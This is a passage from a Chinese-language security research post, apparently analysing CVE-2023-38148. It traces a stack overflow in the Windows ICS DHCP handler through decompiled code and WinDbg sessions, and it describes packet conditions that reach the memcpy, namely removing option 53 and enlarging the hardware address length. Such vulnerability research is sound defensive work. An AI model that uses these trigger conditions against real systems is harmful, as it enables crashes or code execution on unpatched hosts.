&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v5 &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)v3 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">228&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">!&lt;/span>DhcpSendUnicastMessagesEnabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">||&lt;/span> v5[&lt;span style="color:#ae81ff">10&lt;/span>] &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#a6e22e">DhcpAddArpEntry&lt;/span>(v6, (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int8&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)v5 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">28&lt;/span>, (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int8&lt;/span>)v5[&lt;span style="color:#ae81ff">2&lt;/span>], v23) )&lt;span style="color:#75715e">// 这个函数触发了漏洞
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// movzx r8d, byte ptr [r15+2] ; Size
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> ...
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>前面知道 &lt;code>a2 + 230&lt;/code>是长度字段，v5=v2+228，传入 &lt;code>DhcpAddArpEntry&lt;/code>的size参数为v5+2，也就是&lt;code>a2 + 230&lt;/code>
在 &lt;code>DhcpAddArpEntry&lt;/code>函数中，Row为栈内结构体，memcpy传入的长度参数为&lt;code>a2 + 230&lt;/code>，也就是补丁中判断的长度参数。
MIB_IPNET_ROW2结构体定义可以在
&lt;a href="https://learn.microsoft.com/en-us/windows/win32/api/netioapi/ns-netioapi-mib_ipnet_row2" target="_blank">这找到&lt;/a>，其大小为0x58&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#a6e22e">DhcpAddArpEntry&lt;/span>(DWORD a1, &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int8&lt;/span> &lt;span style="color:#f92672">*&lt;/span>Src, &lt;span style="color:#66d9ef">size_t&lt;/span> Size, &lt;span style="color:#66d9ef">struct&lt;/span> _DHCP_INTERFACE &lt;span style="color:#f92672">*&lt;/span>a4)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> MIB_IPNET_ROW2 Row;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v4 &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)Size;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .....
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">memset_0&lt;/span>(&lt;span style="color:#f92672">&amp;amp;&lt;/span>Row, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#66d9ef">sizeof&lt;/span>(Row));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Row.InterfaceIndex &lt;span style="color:#f92672">=&lt;/span> DhcpAdapterIndex;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Row.Address.Ipv4.sin_family &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Row.Address.Ipv4.sin_addr.S_un.S_addr &lt;span style="color:#f92672">=&lt;/span> a1;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Row.PhysicalAddressLength &lt;span style="color:#f92672">=&lt;/span> v4;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">memcpy_0&lt;/span>(Row.PhysicalAddress, Src, v4);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> v11;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>所以漏洞触发路径为 &lt;code>DhcpProcessMessage-&amp;gt;DhcpProcessBootpMessage-&amp;gt;DhcpAddArpEntry-&amp;gt;memcpy_0&lt;/code>，当长度参数过长时可以利用memcpy触发栈溢出。&lt;/p>
&lt;h4 id="动态调试">动态调试&lt;/h4>
&lt;p>使用windbg附加到svchost进程，在 &lt;code>ipnathlp!DhcpProcessMessage&lt;/code>断点，而后触发DHCP请求，windbg在 &lt;code>ipnathlp!DhcpProcessMessage&lt;/code>断下
由于不知道 &lt;code>DhcpProcessMessage&lt;/code>的a2结构体定义，此处构造正常的DHCP请求，并在调试器中查看这个结构体成员信息。
单步运行到判断长度的地方，此时rsi指向传入的 &lt;code>_NH_BUFFER&lt;/code>结构体，&lt;/p>
&lt;pre tabindex="0">&lt;code>0:004&amp;gt; u
ipnathlp!DhcpProcessMessage+0x7f:
00007ff9`c00176f3 488dbee4000000 lea rdi,[rsi+0E4h]
00007ff9`c00176fa 41b604 mov r14b,4
00007ff9`c00176fd 807f0220 cmp byte ptr [rdi+2],20h
00007ff9`c0017701 7636 jbe ipnathlp!DhcpProcessMessage+0xc5 (00007ff9`c0017739)
00007ff9`c0017703 493bdc cmp rbx,r12
00007ff9`c0017706 742a je ipnathlp!DhcpProcessMessage+0xbe (00007ff9`c0017732)
00007ff9`c0017708 44847b1c test byte ptr [rbx+1Ch],r15b
00007ff9`c001770c 7424 je ipnathlp!DhcpProcessMessage+0xbe (00007ff9`c0017732)
&lt;/code>&lt;/pre>&lt;p>可以在调试器内看到 &lt;code>(_BYTE *)a2 + 230)&lt;/code>值为6&lt;/p>
&lt;pre tabindex="0">&lt;code>0:004&amp;gt; db rdi+2
00000203`faa1fdb6 06 00 1a cc 8a 61 00 00-80 00 00 00 00 00 00 00 .....a..........
00000203`faa1fdc6 00 00 00 00 00 00 00 00-00 00 00 0c 29 c2 3a 42 ............).:B
00000203`faa1fdd6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
00000203`faa1fde6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
00000203`faa1fdf6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
00000203`faa1fe06 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
00000203`faa1fe16 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
00000203`faa1fe26 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
&lt;/code>&lt;/pre>&lt;p>而该处数据来源于DHCP客户端发送的DHCP请求，在wireshark中可以看到数据包中刚好有长度字段值为6，说明&lt;code>(_BYTE *)a2 + 230)&lt;/code>处有可能是数据包内的&lt;code>Hardware address length&lt;/code>。&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-38148-windows-ics-eop.zh-cn.assets/20230915104424.png" />&lt;/p>
&lt;p>此时调用栈：&lt;/p>
&lt;pre tabindex="0">&lt;code>0:004&amp;gt; k
Child-SP RetAddr Call Site
0000000e`3487f480 00007ff9`c00143a4 ipnathlp!DhcpProcessMessage+0x86
0000000e`3487f540 00007ff9`c0006ecf ipnathlp!DhcpReadCompletionRoutine+0x644
0000000e`3487f5a0 00007ff9`eebe32ea ipnathlp!NhpIoCompletionRoutine+0x6f
0000000e`3487f5d0 00007ff9`eeb22f86 ntdll!RtlpTpIoCallback+0xca
0000000e`3487f610 00007ff9`ee0a7614 ntdll!TppWorkerThread+0x456
0000000e`3487f910 00007ff9`eeb226b1 KERNEL32!BaseThreadInitThunk+0x14
0000000e`3487f940 00000000`00000000 ntdll!RtlUserThreadStart+0x21
&lt;/code>&lt;/pre>&lt;p>此时尝试手动将&lt;code>(_BYTE *)a2 + 230)&lt;/code>修改为0xfe，继续运行，但没有触发异常。&lt;/p>
&lt;pre tabindex="0">&lt;code>0:004&amp;gt; db rdi+2
00000203`faa1fdb6 06 00 1a cc 8a 61 00 00-80 00 00 00 00 00 00 00 .....a..........
00000203`faa1fdc6 00 00 00 00 00 00 00 00-00 00 00 0c 29 c2 3a 42 ............).:B
00000203`faa1fdd6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
00000203`faa1fde6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
00000203`faa1fdf6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
00000203`faa1fe06 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
00000203`faa1fe16 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
00000203`faa1fe26 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
0:004&amp;gt; eb rdi+2 fe
0:004&amp;gt; db rdi+2
00000203`faa1fdb6 fe 00 1a cc 8a 61 00 00-80 00 00 00 00 00 00 00 .....a..........
00000203`faa1fdc6 00 00 00 00 00 00 00 00-00 00 00 0c 29 c2 3a 42 ............).:B
00000203`faa1fdd6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
00000203`faa1fde6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
00000203`faa1fdf6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
00000203`faa1fe06 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
00000203`faa1fe16 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
00000203`faa1fe26 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
0:002&amp;gt; g
Breakpoint 0 hit
ipnathlp!DhcpProcessMessage:
00007ff9`c0017674 48895c2418 mov qword ptr [rsp+18h],rbx ss:0000000e`346ff630=00000203faa7e350
&lt;/code>&lt;/pre>&lt;p>改为单步调试，再次发起DHCP请求，发现没有进入到漏洞函数 &lt;code>DhcpProcessBootpMessage&lt;/code>中，原因是v13不为0，条件不成立，不会调用 &lt;code>DhcpProcessBootpMessage&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">!&lt;/span>v13 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( WPP_GLOBAL_Control &lt;span style="color:#f92672">!=&lt;/span> (CInterfaceMonitor &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>WPP_GLOBAL_Control
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>((_BYTE &lt;span style="color:#f92672">*&lt;/span>)WPP_GLOBAL_Control &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">28&lt;/span>) &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#f92672">*&lt;/span>((_BYTE &lt;span style="color:#f92672">*&lt;/span>)WPP_GLOBAL_Control &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">25&lt;/span>) &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">4u&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">WPP_SF_&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>((_QWORD &lt;span style="color:#f92672">*&lt;/span>)WPP_GLOBAL_Control &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>), &lt;span style="color:#ae81ff">98&lt;/span>i64, &lt;span style="color:#f92672">&amp;amp;&lt;/span>WPP_2a3aeb8dd77c3a1919c551579bb6cf5d_Traceguids);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">DhcpProcessBootpMessage&lt;/span>(a1, a2, &lt;span style="color:#f92672">&amp;amp;&lt;/span>v12); &lt;span style="color:#75715e">// 这里触发漏洞
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_25;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>对v13下写断点&lt;/p>
&lt;pre tabindex="0">&lt;code>0:004&amp;gt; ba w1 rsp+0x38
0:004&amp;gt; g
Breakpoint 6 hit
msvcrt!memset+0x35:
00007ff9`ed1046b5 4983e908 sub r9,8
&lt;/code>&lt;/pre>&lt;p>触发断点，此时调用栈如下，对应代码为 &lt;code>memset_0(a3, 0, 0x40ui64);&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>0:004&amp;gt; k
Child-SP RetAddr Call Site
0000000e`3487f418 00007ff9`c0015b63 msvcrt!memset+0x35
0000000e`3487f420 00007ff9`c0017754 ipnathlp!DhcpExtractOptionsFromMessage+0x7b
0000000e`3487f480 00007ff9`c00143a4 ipnathlp!DhcpProcessMessage+0xe0
0000000e`3487f540 00007ff9`c0006ecf ipnathlp!DhcpReadCompletionRoutine+0x644
0000000e`3487f5a0 00007ff9`eebe32ea ipnathlp!NhpIoCompletionRoutine+0x6f
0000000e`3487f5d0 00007ff9`eeb22f86 ntdll!RtlpTpIoCallback+0xca
0000000e`3487f610 00007ff9`ee0a7614 ntdll!TppWorkerThread+0x456
0000000e`3487f910 00007ff9`eeb226b1 KERNEL32!BaseThreadInitThunk+0x14
0000000e`3487f940 00000000`00000000 ntdll!RtlUserThreadStart+0x21
&lt;/code>&lt;/pre>&lt;p>此处将目标内存清零，不符合前面说的条件，继续运行，再次触发写断，调用栈为&lt;/p>
&lt;pre tabindex="0">&lt;code>0:004&amp;gt; k
Child-SP RetAddr Call Site
0000000e`3487f420 00007ff9`c0017754 ipnathlp!DhcpExtractOptionsFromMessage+0x428
0000000e`3487f480 00007ff9`c00143a4 ipnathlp!DhcpProcessMessage+0xe0
0000000e`3487f540 00007ff9`c0006ecf ipnathlp!DhcpReadCompletionRoutine+0x644
0000000e`3487f5a0 00007ff9`eebe32ea ipnathlp!NhpIoCompletionRoutine+0x6f
0000000e`3487f5d0 00007ff9`eeb22f86 ntdll!RtlpTpIoCallback+0xca
0000000e`3487f610 00007ff9`ee0a7614 ntdll!TppWorkerThread+0x456
0000000e`3487f910 00007ff9`eeb226b1 KERNEL32!BaseThreadInitThunk+0x14
0000000e`3487f940 00000000`00000000 ntdll!RtlUserThreadStart+0x21
&lt;/code>&lt;/pre>&lt;p>对应在&lt;code>DhcpExtractOptionsFromMessage&lt;/code>的代码如下，当OptionID为0x35时进入case语句内&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>v9 &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">struct&lt;/span> _DHCP_OPTION &lt;span style="color:#f92672">*&lt;/span>)((&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)a1 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">240&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>OptionID &lt;span style="color:#f92672">=&lt;/span> v9&lt;span style="color:#f92672">-&amp;gt;&lt;/span>OptionID;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( OptionID )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">switch&lt;/span> ( OptionID )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">0x35u&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v6 &lt;span style="color:#f92672">!=&lt;/span> (CInterfaceMonitor &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>WPP_GLOBAL_Control
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>((_BYTE &lt;span style="color:#f92672">*&lt;/span>)v6 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">28&lt;/span>) &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#f92672">*&lt;/span>((_BYTE &lt;span style="color:#f92672">*&lt;/span>)v6 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">25&lt;/span>) &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">4u&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">WPP_SF_&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>((_QWORD &lt;span style="color:#f92672">*&lt;/span>)v6 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>), &lt;span style="color:#ae81ff">44&lt;/span>i64, &lt;span style="color:#f92672">&amp;amp;&lt;/span>WPP_2a3aeb8dd77c3a1919c551579bb6cf5d_Traceguids);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v6 &lt;span style="color:#f92672">=&lt;/span> WPP_GLOBAL_Control;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#a6e22e">BYTE1&lt;/span>(v9&lt;span style="color:#f92672">-&amp;gt;&lt;/span>OptionID) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> a3[&lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> v9;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>_DHCP_OPTION&lt;/code>结构体定义如下，对应于DHCP请求内的option&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">typedef&lt;/span> DWORD DHCP_OPTION_ID;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> _DHCP_OPTION
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DHCP_OPTION_ID OptionID;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> LPWSTR OptionName;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> LPWSTR OptionComment;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DHCP_OPTION_DATA DefaultValue;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DHCP_OPTION_TYPE OptionType;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#ae81ff">002&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> db rdi
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">00000203&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>faa1fea4 &lt;span style="color:#ae81ff">35&lt;/span> &lt;span style="color:#ae81ff">01&lt;/span> &lt;span style="color:#ae81ff">03&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>d &lt;span style="color:#ae81ff">07&lt;/span> &lt;span style="color:#ae81ff">01&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>c&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">29&lt;/span> c2 &lt;span style="color:#ae81ff">3&lt;/span>a &lt;span style="color:#ae81ff">42&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span> &lt;span style="color:#ae81ff">04&lt;/span> c0 a8 &lt;span style="color:#ae81ff">5.&lt;/span>.&lt;span style="color:#f92672">=&lt;/span>....).&lt;span style="color:#f92672">:&lt;/span>B2...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">00000203&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>faa1feb4 &lt;span style="color:#ae81ff">89&lt;/span> cd &lt;span style="color:#ae81ff">0&lt;/span>c &lt;span style="color:#ae81ff">0f&lt;/span> &lt;span style="color:#ae81ff">44&lt;/span> &lt;span style="color:#ae81ff">45&lt;/span> &lt;span style="color:#ae81ff">53&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>b&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">54&lt;/span> &lt;span style="color:#ae81ff">4f&lt;/span> &lt;span style="color:#ae81ff">50&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>d &lt;span style="color:#ae81ff">54&lt;/span> &lt;span style="color:#ae81ff">35&lt;/span> &lt;span style="color:#ae81ff">50&lt;/span> &lt;span style="color:#ae81ff">37&lt;/span> ....DESKTOP&lt;span style="color:#f92672">-&lt;/span>T5P7
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">00000203&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>faa1fec4 &lt;span style="color:#ae81ff">34&lt;/span> &lt;span style="color:#ae81ff">45&lt;/span> &lt;span style="color:#ae81ff">53&lt;/span> &lt;span style="color:#ae81ff">51&lt;/span> &lt;span style="color:#ae81ff">12&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">44&lt;/span> &lt;span style="color:#ae81ff">45&lt;/span> &lt;span style="color:#ae81ff">53&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>b &lt;span style="color:#ae81ff">54&lt;/span> &lt;span style="color:#ae81ff">4f&lt;/span> &lt;span style="color:#ae81ff">50&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>d &lt;span style="color:#ae81ff">4&lt;/span>ESQ....DESKTOP&lt;span style="color:#f92672">-&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">00000203&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>faa1fed4 &lt;span style="color:#ae81ff">54&lt;/span> &lt;span style="color:#ae81ff">35&lt;/span> &lt;span style="color:#ae81ff">50&lt;/span> &lt;span style="color:#ae81ff">37&lt;/span> &lt;span style="color:#ae81ff">34&lt;/span> &lt;span style="color:#ae81ff">45&lt;/span> &lt;span style="color:#ae81ff">53&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>c&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">08&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>d &lt;span style="color:#ae81ff">53&lt;/span> &lt;span style="color:#ae81ff">46&lt;/span> &lt;span style="color:#ae81ff">54&lt;/span> &lt;span style="color:#ae81ff">20&lt;/span> &lt;span style="color:#ae81ff">35&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>e T5P74ES&lt;span style="color:#f92672">&amp;lt;&lt;/span>.MSFT &lt;span style="color:#ae81ff">5.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">00000203&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>faa1fee4 &lt;span style="color:#ae81ff">30&lt;/span> &lt;span style="color:#ae81ff">37&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>e &lt;span style="color:#ae81ff">01&lt;/span> &lt;span style="color:#ae81ff">03&lt;/span> &lt;span style="color:#ae81ff">06&lt;/span> &lt;span style="color:#ae81ff">0f&lt;/span> &lt;span style="color:#ae81ff">1f&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">21&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>b &lt;span style="color:#ae81ff">2&lt;/span>c &lt;span style="color:#ae81ff">2&lt;/span>e &lt;span style="color:#ae81ff">2f&lt;/span> &lt;span style="color:#ae81ff">77&lt;/span> &lt;span style="color:#ae81ff">79&lt;/span> f9 &lt;span style="color:#ae81ff">07.&lt;/span>.....&lt;span style="color:#f92672">!+&lt;/span>,.&lt;span style="color:#f92672">/&lt;/span>wy.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-38148-windows-ics-eop.zh-cn.assets/20230915124447.png" />&lt;/p>
&lt;p>根据RFC
&lt;a href="https://datatracker.ietf.org/doc/html/rfc2132#page-4" target="_blank">rfc2132&lt;/a> option 53为传递DHCP消息类型，第一个字节是操作编号，第二个字节恒为1，第三个字节是消息类型，范围是1-9
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-38148-windows-ics-eop.zh-cn.assets/20230915155551.png" />
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-38148-windows-ics-eop.zh-cn.assets/20230915155648.png" />&lt;/p>
&lt;p>根据代码，当DHCP中含有option 53一定会进入 &lt;code>DhcpExtractOptionsFromMessage&lt;/code>的 &lt;code>if ( BYTE1(v9-&amp;gt;OptionID) )&lt;/code>，把&lt;code>a3[1]&lt;/code>赋值为不为零的值。
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-38148-windows-ics-eop.zh-cn.assets/20230915155756.png" />
回到&lt;code>DhcpProcessMessage&lt;/code>内，v13就不为0，不能进入触发漏洞的逻辑
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-38148-windows-ics-eop.zh-cn.assets/20230915155919.png" />&lt;/p>
&lt;p>重新构造DHCP数据包,，删除option53并将 &lt;code>Hardware address length&lt;/code>改为100，单步调试，成功进入到 &lt;code>DhcpAddArpEntry&lt;/code>函数内。&lt;/p>
&lt;pre tabindex="0">&lt;code>0:004&amp;gt; k
Child-SP RetAddr Call Site
0000000e`3487f2a0 00007ff9`c0016766 ipnathlp!DhcpAddArpEntry+0x14a
